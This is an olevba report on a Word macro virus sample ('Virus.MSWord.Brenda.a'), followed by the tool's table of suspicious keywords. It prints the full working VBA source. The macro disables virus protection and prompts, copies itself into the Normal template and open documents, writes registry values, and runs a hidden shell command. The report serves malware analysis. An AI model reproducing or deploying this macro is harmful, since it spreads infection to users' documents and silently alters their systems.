olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Brenda.a-931ced445972e21e7b2395d781405847e4d7f0d9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Brenda.a-931ced445972e21e7b2395d781405847e4d7f0d9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next

bSavedState = ActiveDocument.Saved

Application.EnableCancelKey = Not True
Options.VirusProtection = Not True
Options.SaveNormalPrompt = Not True
Options.ConfirmConversions = Not True

sLines = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)

If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString sLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Private Sub Document_Close()"

System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "(default)"
System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\DefaultIcon", "") = "DefaultIcon"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000008", "SMTP Display Name") = ""
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000008", "SMTP Email Address") = ""
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Nico Mak Computing\WinZip\WinIni", "Name") = "Northampton School for Boys"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Nico Mak Computing\WinZip\WinIni", "SN") = "415F7097"
System.PrivateProfileString("win.ini", "WinZip", "Name") = "Northampton School for Boys"
System.PrivateProfileString("win.ini", "WinZip", "Name") = "415F7097"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Applets\Hearts", "name") = "NSB"

Shell "label c:", vbHide

ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Open()" Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString sLines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Private Sub Document_Open()"
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If

ActiveDocument.Saved = bSavedState

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

